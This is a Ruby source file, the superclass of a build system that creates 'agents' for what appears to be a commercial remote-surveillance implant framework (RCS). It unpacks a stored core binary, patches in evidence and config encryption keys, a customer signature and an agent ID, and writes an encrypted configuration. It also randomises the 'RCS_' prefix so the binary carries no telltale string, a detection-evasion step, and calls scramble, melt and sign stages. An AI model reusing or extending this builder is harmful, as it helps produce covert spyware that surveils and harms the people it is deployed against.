#
#  Agent creation superclass
#

# from RCS::Common
require 'rcs-common/trace'

require 'fileutils'
require 'tmpdir'
require 'zip/zip'
require 'zip/zipfilesystem'
require 'securerandom'

module RCS
module DB

class Build
  include RCS::Tracer

  attr_reader :outputs
  attr_reader :platform
  attr_reader :tmpdir
  attr_reader :factory

  @builders = {}

  def self.register(klass)
    if klass.to_s.start_with? "Build" and klass.to_s != 'Build'
      plat = klass.to_s.downcase
      plat['build'] = ''
      @builders[plat.to_sym] = RCS::DB.const_get(klass)
    end
  end

  def initialize
    @outputs = []
  end

  def self.factory(platform)
    begin
      @builders[platform].new
    rescue Exception => e
      raise "Builder for #{platform} not found"
    end
  end

  def load(params)
    core = ::Core.where({name: @platform}).first
    raise "Core for #{@platform} not found" if core.nil?

    @core = GridFS.to_tmp core[:_grid].first
    trace :debug, "Build: loaded core: #{@platform} #{core.version} #{@core.size} bytes"

    @factory = ::Item.where({_kind: 'factory', ident: params['ident']}).first
    raise "Factory #{params['ident']} not found" if @factory.nil?
    
    trace :debug, "Build: loaded factory: #{@factory.name}"
  end

  def unpack
    @tmpdir = File.join Dir.tmpdir, "%f" % Time.now
    trace :debug, "Build: creating: #{@tmpdir}"
    Dir.mkdir @tmpdir

    trace :debug, "Build: unpack: #{@core.path}"

    Zip::ZipFile.open(@core.path) do |z|
      z.each do |f|
        f_path = File.join(@tmpdir, f.name)
        FileUtils.mkdir_p(File.dirname(f_path))
        z.extract(f, f_path) unless File.exist?(f_path)
        @outputs << f.name
      end
    end

    # delete the tmpfile of the core
    @core.close!
  end

  def patch(params)
    trace :debug, "Build: patching [#{params[:core]}] file"

    # open the core and binary patch the parameters
    core_file = File.join @tmpdir, params[:core]
    file = File.open(core_file, 'rb+')
    content = file.read

    # evidence encryption key
    begin
      key = Digest::MD5.digest(@factory.logkey) + SecureRandom.random_bytes(16)
      content['3j9WmmDgBqyU270FTid3719g64bP4s52'] = key
    rescue
      raise "Evidence key marker not found"
    end

    # conf encryption key
    begin
      key = Digest::MD5.digest(@factory.confkey) + SecureRandom.random_bytes(16)
      content['Adf5V57gQtyi90wUhpb8Neg56756j87R'] = key
    rescue
      raise "Config key marker not found"
    end

    # per-customer signature
    begin
      sign = ::Signature.where({scope: 'agent'}).first
      signature = Digest::MD5.digest(sign.value) + SecureRandom.random_bytes(16)
      content['f7Hk0f5usd04apdvqw13F5ed25soV5eD'] = signature
    rescue
      raise "Signature marker not found"
    end

    # Agent ID
    begin
      id = @factory.ident
      # first three bytes are random to avoid the RCS string in the binary file
      id['RCS_'] = SecureRandom.hex(2)
      content['av3pVck1gb4eR2'] = id
    rescue
      raise "Agent ID marker not found"
    end

    # demo parameters
    begin
      content['hxVtdxJ/Z8LvK3ULSnKRUmLE'] = SecureRandom.random_bytes(24) unless params['demo']
    rescue
      raise "Demo marker not found"
    end

    trace :debug, "Build: saving config to [#{params[:config]}] file"

    # retrieve the config and save it to a file
    config = @factory.configs.first.encrypted_config(@factory.confkey)
    conf_file = File.join @tmpdir, params[:config]
    File.open(conf_file, 'wb') {|f| f.write config}

    @outputs << params[:config]
  end

  def scramble
    trace :debug, "super #{__method__}"
  end

  def melt
    trace :debug, "super #{__method__}"
  end

  def sign 
    trace :debug, "super #{__method__}"
  end

  def pack
    trace :debug, "super #{__method__}"
  end

  def clean
    if @tmpdir
      trace :debug, "Build: cleaning up #{@tmpdir}"
      FileUtils.rm_rf @tmpdir
    end
  end

  def create(params)
    trace :debug, "Building Agent: #{params}"

    begin
      load params['factory']
      unpack
      patch params['binary']
      scramble
      melt
      sign
      pack
    rescue Exception => e
      trace :error, "Cannot build: #{e.message}"
      #trace :fatal, "EXCEPTION: [#{e.class}] " << e.backtrace.join("\n")
      clean
      raise 
    end
    
  end

end

# require all the builders
Dir[File.dirname(__FILE__) + '/build/*.rb'].each do |file|
  require file
end

# register all builders into Build
RCS::DB.constants.keep_if{|x| x.to_s.start_with? 'Build'}.each do |klass|
  RCS::DB::Build.register klass
end

end #DB::
end #RCS::
